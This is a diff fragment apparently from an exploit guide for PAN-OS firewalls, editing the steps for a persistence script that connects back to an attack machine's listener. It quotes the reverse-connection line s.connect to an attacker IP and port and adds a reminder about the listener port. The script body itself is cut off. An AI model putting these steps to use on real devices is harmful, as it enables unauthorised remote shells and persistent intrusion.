@@ -26,7 +26,7 @@ Exploit Setup:
 Persistence Script Setup:
 
 1. Perform the following command: nano pan_os_comm.py
-2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) ***
+2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
 
 ```
 #!/usr/bin/env python3
